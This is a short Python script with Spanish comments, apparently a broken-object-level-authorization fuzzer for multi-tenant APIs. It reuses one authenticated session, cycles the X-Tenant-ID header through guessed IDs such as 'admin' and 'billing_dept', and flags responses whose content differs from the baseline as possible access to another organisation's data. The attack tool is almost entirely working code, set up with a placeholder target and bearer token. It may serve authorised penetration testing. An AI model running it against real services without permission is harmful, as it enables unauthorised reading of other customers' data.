import requests
import json
import difflib

# ∴ CONTEXT: BOLA (Broken Object Level Authorization) Fuzzer v1.0
# El objetivo es identificar si cambiar el 'tenant_id' en un header o parámetro 
# permite acceder a datos de otra organización usando la MISMA sesión.

def scan_bola(target_url, base_headers, tenant_ids, header_key="X-Tenant-ID"):
    """
    Compara la respuesta base con respuestas fuzzeadas.
    """
    print(f"∴ STARTING BOLA SCAN ON: {target_url}")
    print(f"∴ AUDITING HEADER: {header_key}")
    
    # Obtener respuesta base (tu propio tenant)
    try:
        base_response = requests.get(target_url, headers=base_headers)
        base_data = base_response.text
        print(f"∴ BASE RESPONSE STATUS: {base_response.status_code}")
    except Exception as e:
        print(f"Error connecting to target: {e}")
        return

    for t_id in tenant_ids:
        # Modificar el header del inquilino
        test_headers = base_headers.copy()
        test_headers[header_key] = t_id
        
        try:
            res = requests.get(target_url, headers=test_headers)
            
            # CRITERIO DE ÉXITO: Status 200 y el contenido es DISTINTO al base
            # (Lo que indica que estamos viendo datos ajenos, no un error o nuestra propia data).
            if res.status_code == 200:
                diff = difflib.SequenceMatcher(None, base_data, res.text).ratio()
                if diff < 0.95:  # Si el contenido ha cambiado significativamente (>5%)
                    print(f"[!] POTENTIAL BOLA DETECTED: Tenant-ID: {t_id}")
                    print(f"    Similarity Ratio: {diff:.2f} | Status: {res.status_code}")
                    # print(f"    Preview: {res.text[:100]}...")
            else:
                # print(f"[-] Denied for Tenant-ID: {t_id} (Status: {res.status_code})")
                pass

        except Exception as e:
            continue

if __name__ == "__main__":
    # CONFIGURACIÓN (REPLACE WITH REAL DATA FROM YOUR CAIDO/BURP LOGS)
    TARGET = "https://api.target-saas-platform.com/v1/dashboard/stats"
    HEADERS = {
        "Authorization": "Bearer YOUR_REAL_JWT_TOKEN",
        "X-Tenant-ID": "MY_OWN_TENANT_ID_123"
    }
    CANDIDATES = ["org_999", "admin", "test_org", "client_456", "billing_dept"]
    
    scan_bola(TARGET, HEADERS, CANDIDATES)
